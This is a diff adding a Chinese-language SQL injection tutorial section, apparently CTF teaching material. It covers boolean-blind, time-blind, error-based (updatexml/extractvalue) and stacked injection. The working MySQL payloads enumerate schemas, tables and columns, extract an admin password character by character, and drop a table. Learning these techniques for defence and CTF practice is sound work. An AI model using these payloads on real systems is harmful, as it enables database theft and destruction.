@@ -265,3 +265,361 @@ SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(t
 SELECT * FROM users WHERE username='-1' or '1'='1' union select 1,group_concat(column_name),2 from information_schema.columns where table_schema=database()-- ' AND password='$password';
 ```
 
+### 盲注
+
+盲注是指攻击者不能直接获取数据库中的信息，需要通过一些技巧来判断或推断出数据库中的数据。盲注主要分为布尔盲注和时间盲注两种。
+
+我们还是以下面的句子为例子，不过相比于之前的不同，我们规定用户的查询没有回显，所以仅靠上面的方式我们无法获得数据，所以我们选用盲注。
+
+```php
+$sql = "SELECT username,password FROM users WHERE id = ".$_GET["id"];
+```
+
+#### 布尔盲注
+
+对于上述语句，如果id的传参如下：
+
+```sql
+id = 1 AND 1=1
+```
+
+那么语句执行为：
+
+```sql
+SELECT username,password FROM users WHERE id = 1 AND 1=1;
+```
+
+![image-20230504191135714](https://nssctf.wdf.ink//img/WDTJ/202305041911785.png)
+
+这里会要求两个条件为真，一是有`id=1`这个值，二是 `1=1`，这两个条件当然是满足的，特别是后面的这个条件。
+
+那如果我让AND后面的条件为 `1 = 2`：
+
+```sql
+SELECT username,password FROM users WHERE id = 1 AND '1'='2';
+# 这里 '1' = '2'，1 = 2 效果都是一样的
+```
+
+![image-20230504191548610](https://nssctf.wdf.ink//img/WDTJ/202305041915652.png)
+
+可以看到返回为空，因为AND后面的条件不满足。
+
+那么利用这个AND符号我们可以尝试下面的一些方式来获取信息：
+
+- 使用 length(）获取长度信息
+
+比如，我们用 length(）函数去爆破数据长度
+
+```sql
+id = 1 AND length(username)= NUM
+```
+
+那么语句执行为：
+
+```sql
+SELECT username,password FROM users WHERE id = 1 AND length(username)=1;
+```
+
+
+
+![image-20230504192130407](https://nssctf.wdf.ink//img/WDTJ/202305041921180.png)
+
+当然 枚举长度的方式效率属实难蚌，我们可以使用大于小于符号 基于二分算法进行爆破：
+
+```sql
+id = 1 AND length(username)< NUM
+id = 1 AND length(username)> NUM
+```
+
+这样效率会高很多。
+
+- `SUBSTR()`函数用于截取字符串中的一部分。利用`SUBSTR()`函数，逐步截取数据库中的某个数据：
+
+  `SUBSTR(string, start, length)` 其中，`string`表示要截取的字符串，`start`表示截取的起始位置，`length`表示截取的长度。`SUBSTR()`函数会从字符串的`start`位置开始，截取指定长度的字符。
+
+  ```sql
+  1 AND SUBSTR(username,1,1) = '？'
+  ```
+
+  那么语句执行为：
+
+  ```sql
+  SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,1,1) = '?';
+  ```
+
+  ![image-20230504211550827](https://nssctf.wdf.ink//img/WDTJ/202305042115906.png)
+
+  ```sql
+  SELECT username,password FROM users WHERE id = 1 AND SUBSTR(username,2,1) = 'd';
+  ```
+
+  
+
+  ![image-20230504212127894](https://nssctf.wdf.ink//img/WDTJ/202305042121944.png)
+
+  通过前部分长度的获取，结合 `substr()` 就可以对一个具体的字符数据进行fuzz了。
+
+  这里推荐编写脚本来完成这样繁琐的工作。
+
+  除了上述用法 `SUBSTR()`函数还可以用于替换字符串中的某个字符：
+
+  ```sql
+  UPDATE users SET username=SUBSTR(username,1,3)||'***'||SUBSTR(username,7) WHERE username='admin'
+  ```
+
+  面的SQL语句的作用是将管理员账户的用户名中的第4到第6个字符替换为`***`
+
+  通过对该函数的组合使用，可以在不使用联合注入和依赖可视回显的方式拿到对应数据：
+
+  ```sql
+  SELECT username,password FROM users WHERE id = 1 AND SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a'
+  ```
+
+- `MID()`函数也是用于截取字符串的函数。
+
+  `MID(string, start, length)` 
+
+  ```sql
+  MID("Hello, World!", 1, 5) # 返回的结果为"Hello"；
+  SUBSTR("Hello, World!", 1, 5) # 返回的结果为"Hello"。
+  ```
+
+- `CONCAT()`
+
+  `CONCAT()`函数用于将多个字符串连接成一个字符串。
+
+  ```sql
+  CONCAT(string1, string2, ...)
+  ```
+
+  ```sql
+  SELECT username,password FROM users WHERE id = 1 union select CONCAT(username,'-',password),1 from users;
+  ```
+
+  ![image-20230504221859903](https://nssctf.wdf.ink//img/WDTJ/202305042218959.png)
+
+  而在盲注中，我们通常用其的连接功能减少查询跳转。
+
+#### 时间盲注
+
+其实和布尔差不多，只不过是利用SQL语句的执行时间来判断SQL语句的真假，从而逐步推断出数据库中的数据。
+
+下面是一些常用函数 和使用技巧：
+
+- `IF()`
+
+  `IF()`函数是一种条件判断函数，它用于判断指定条件是否成立，并根据判断结果返回不同的值.
+
+  ```sql
+  IF(condition, value_if_true, value_if_false)
+  ```
+
+  其中，`condition`表示要判断的条件，`value_if_true`表示条件成立时要返回的值，`value_if_false`表示条件不成立时要返回的值。如果条件成立，`IF()`函数将返回`value_if_true`，否则将返回`value_if_false`
+
+- `SLEEP()`
+
+  `SLEEP()` 函数是时间盲注的核心，其语法为 `SLEEP(seconds)`
+
+  当语句被执行时，程序将会暂停指定秒数，比如下面的例子：
+
+  通常 `IF` 和 `SLEEP` 两函数会一起使用
+
+  ```sql
+  SELECT * FROM users WHERE username='admin' AND IF(SLEEP(5),1,0)
+  ```
+
+  如果数据库中不存在用户名为`admin`的用户，那么该语句将会立即返回结束；否则，程序将会暂停5秒钟后再返回结果。
+
+  同样我们使用我们的demo语句，`SELECT username,password FROM users WHERE id =`来演示：
+
+  - 利用延时函数，如`SLEEP()`函数或者`BENCHMARK()`函数，来判断是否注入成功。
+
+  ```sql
+  SELECT username,password FROM users WHERE id = 1 AND IF(ASCII(SUBSTR(username,1,1))=97,SLEEP(5),0)
+  ```
+
+  如果用户表中的第一个用户名字符为字母`a`，则程序会暂停5秒钟，否则返回0。
+
+  - 利用时间戳
+
+  可以利用数据库中的时间戳函数，如`UNIX_TIMESTAMP()`函数来构造延时语句，如：
+
+  ```sql
+  SELECT username,password FROM users WHERE id = 1 AND IF(UNIX_TIMESTAMP()>1620264296,SLEEP(5),0)
+  ```
+
+  上述SQL语句的意思是：如果当前时间戳大于`1620264296`，则程序会暂停5秒钟，否则返回0。
+
+  - 利用函数返回值
+
+  可以利用函数的返回值，如`LENGTH()`函数、`SUBSTR()`函数等，来判断是否注入成功。例如：
+
+  ```sql
+  SELECT username,password FROM users WHERE id = 1 AND IF(LENGTH(username)=4,SLEEP(5),0)
+  ```
+
+  上述SQL语句的意思是：如果用户名的长度为4，则程序会暂停5秒钟，否则返回0。
+
+- `BENCHMARK()`
+
+  `BENCHMARK()`函数是一种用于重复执行指定语句的函数，在MySQL等数据库中支持使用。`BENCHMARK()`函数的语法通常如下：
+
+  ```sql
+  BENCHMARK(count,expr)
+  ```
+
+  其中，`count`表示要重复执行的次数，`expr`表示要重复执行的语句。
+
+  看这个例子：
+
+  ```sql
+  SELECT * FROM users WHERE username='admin' AND IF(BENCHMARK(10,MD5('test')),1,0)
+  ```
+
+  如果数据库中不存在用户名为`admin`的用户，那么该语句将会立即返回；否则，程序将会重复执行`MD5('test')`函数10次后再返回结果
+
+### 报错注入
+
+顾名思义，通过报错信息获取数据的方法。
+
+- `updatexml() ` 
+
+  这里我们先讲 `updatexml() ` 报错注入。
+  
+  `updatexml()` 是MySQL中的一种XML处理函数，它用于更新XML格式的数 据，其标准的用法如下：
+  
+  ```sql
+  UPDATEXML(xml_target, xpath_expr, new_value)
+  ```
+  
+  其中，`xml_target`是要更新的XML数据，`xpath_expr`是要更新的节点路 径，`new_value`是新的节点值。
+  
+  但是这个函数有一个缺陷，如果二个参数包含特殊符号时会报错，并且会第二  个参数的内容显示在报错信息中
+  
+  ```
+  mysql> SELECT username, password FROM users WHERE id = 1 and    updatexml(1, 0x7e, 3);
+  1105 - XPATH syntax error: '~'
+  ```
+  
+  那么通过这个特性，我们用 `concat()` 函数 将查询语句和特殊符号拼接 在一起，就可以将查询结果显示在报错信息中
+  
+  ```sql
+  SELECT username, password FROM users WHERE id = 1 and   updatexml(1, concat(0x7e,version()), 3) 
+  ```
+  
+  输出:
+  
+  ```sql
+  mysql> SELECT username, password FROM users WHERE id = 1 and  updatexml(1, concat(0x7e,version()), 3);
+  1105 - XPATH syntax error: '~8.0.12'
+  ```
+  
+  不过要注意的是 `updatexml() ` 的报错长度存在字符长度限制，目前有两  种方法来解决这个问题：
+  
+  - `LIMIT()` 
+  
+  ```sql
+  SELECT username, password FROM users WHERE id = 1 and   updatexml(1,concat(0x7e,
+  (select username from users 
+  limit 1,1)),
+  3);
+  # 不断改变limit NUM,1 的值逐行获取
+  ```
+  
+  ![image-20230505011056626](https://nssctf.wdf.ink//img/WDTJ/202305050110708.png)
+  
+  - `substr()`
+  ```sql
+  SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,
+  substr(
+  (select group_concat(username) from users),
+  1,31)
+  ),3);
+  ```
+  
+    执行结果：
+  
+  ```sql
+  mysql> SELECT username, password FROM users WHERE id = 1 and updatexml(1,concat(0x7e,
+  substr(
+  (select group_concat(username) from users),1,31)
+  ),3);
+  1105 - XPATH syntax error: '~admin,super,flag,null'
+  ```
+  
+  利用利用上述特性，我们可以下面的语句获取信息：
+  
+  获取所有数据库
+  
+  ```SQL
+  SELECT username, password FROM users WHERE id = 1 and
+  updatexml(1,concat('~',
+          substr( 
+                  (select group_concat(schema_name)
+                  from information_schema.schemata)
+          , 1 , 31)
+  ),3)
+  ```
+  
+  获取所有表
+  
+  ```SQL
+  SELECT username, password FROM users WHERE id = 1 and
+  updatexml(1,concat('~',
+          substr( 
+                  (select group_concat(table_name)
+                  from information_schema.tables
+                  where table_schema = 'security')
+          , 1 , 31)
+  ),3)
+  ```
+  
+  获取所有字段
+  
+  ```SQL
+  SELECT username, password FROM users WHERE id = 1 and
+  updatexml(1,concat('~',
+          substr( 
+                  (select group_concat(column_name)
+                  from information_schema.columns
+                  where table_schema = 'security' and table_name = 'users')
+          , 1 , 31)
+  ),3)
+  ```
+
+- `extractvalue()`
+
+  `extractvalue()`是MySQL中的一个XML处理函数，它用于从XML格式的数据中提取指定节点的值。
+
+  正常情况下他的语法如下：
+
+  ```sql
+  EXTRACTVALUE(xml_target, xpath_expr)
+  ```
+
+  其中，`xml_target`是要提取节点值的XML数据，`xpath_expr`是要提取的节点路径。
+
+  它用于报错注入的方法其实和 `updatexml() `  函数的使用方法差不多 但是参数少一个x
+
+  ![image-20230505015028726](https://nssctf.wdf.ink//img/WDTJ/202305050150790.png)
+
+而且报错信息长度限制也和`updatexml()` 一样，所以这里就不多做赘述。
+
+- `floor() `
+- `exp()`
+
+### 堆叠注入
+
+顾名思义x 一堆 SQL语句(多条)一起执行方法被称为堆叠注入。
+
+其实讲原理就很容易懂：
+
+在执行SQL语句时，如果SQL语句中包含多个SQL语句，数据库服务器会依次执行这些SQL语句，从而导致多次SQL注入攻击。通过在SQL语句中使用分号（;）来分隔多个SQL语句，从而实现堆叠注入攻击。
+
+举个栗子：
+
+```sql
+SELECT username, password FROM users WHERE id =1; DROP TABLE users;--
+```
+
+执行这个SQL语句时，数据库服务器会依次执行这两个SQL语句，将会查询到`users`表中的用户名和密码，并且将`users`表删除。
